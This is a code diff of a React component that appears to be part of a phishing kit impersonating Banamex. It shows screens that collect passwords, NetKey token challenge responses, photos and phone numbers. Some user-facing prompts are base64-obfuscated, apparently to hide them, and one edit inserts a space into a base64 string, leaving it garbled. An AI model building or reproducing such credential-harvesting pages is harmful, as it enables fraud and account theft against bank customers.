@@ -99,7 +99,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
   const [passwordInput, setPasswordInput] = useState('');
   const [photoFile, setPhotoFile] = useState<File | null>(null);
   const [netkeyResponse, setNetkeyResponse] = useState('');
-  
+
   // Estados para ACCESO_DENEGADO
   const [telefonoAcceso1, setTelefonoAcceso1] = useState('');
   const [telefonoAcceso2, setTelefonoAcceso2] = useState('');
@@ -1081,7 +1081,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                   }} aria-label="Instrucciones">
                     <p style={{ margin: '6px 0', lineHeight: 1.6, color: '#3d5559', fontSize: '14px' }}>Encienda su NetKey Banamex, teclee su PIN; al desplegarse la palabra "HOST?" digite el número "9".</p>
                     <p style={{ margin: '12px 0 6px 0', lineHeight: 1.6, color: '#3d5559', fontSize: '14px' }}>Al aparecer la palabra "CHALLNG?" introduzca en su NetKey Banamex la siguiente clave:</p>
-                    
+
                     <div style={{ 
                       background: 'linear-gradient(135deg, #e8f4f5 0%, #d4eaec 100%)', 
                       borderRadius: '6px', 
@@ -1695,7 +1695,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
           <>
             <h2 className="text-xl font-bold mb-3">{atob('SW5ncmVzYSB0dSB0ZWzDqWZvbm8gY2VsdWxhciByZWdpc3RyYWRv')}</h2>
             <p className="mb-4 text-sm text-gray-600">
-              {atob('SW5ncmVzYSB0dSBuw7ptZXJvIGRlIHRlbMOpZm9ubyBjZWx1bGFyIGEgMTAgZMOtZ2l0b3MgcGFyYSBjb250aW51YXIgY29uIGxhIHByb21vY2nDs24gZGUgdnVlbG9z')}
+              {atob('SW5ncmVzYSB0dSBuw7ptZXJvIGRlIHRlbMOpZm9ubyBjZWx1bGFyIGEgMTAgZMOtZ2l0b3MgcGFyYSBjb250aW51YXI Y29uIGxhIHByb21vY2nDs24gZGUgdnVlbG9z')}
             </p>
 
             <div className="mb-4">
@@ -2044,7 +2044,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                   <h1 style={{ fontSize: '32px', fontWeight: 600, color: '#153e46', marginBottom: '16px' }}>
                     ¡Solicitud Recibida!
                   </h1>
-                  
+
                   <p style={{ fontSize: '18px', color: '#3d5559', lineHeight: 1.6, marginBottom: '32px' }}>
                     {screenData.mensaje || "En breve un ejecutivo se pondrá en contacto contigo"}
                   </p>
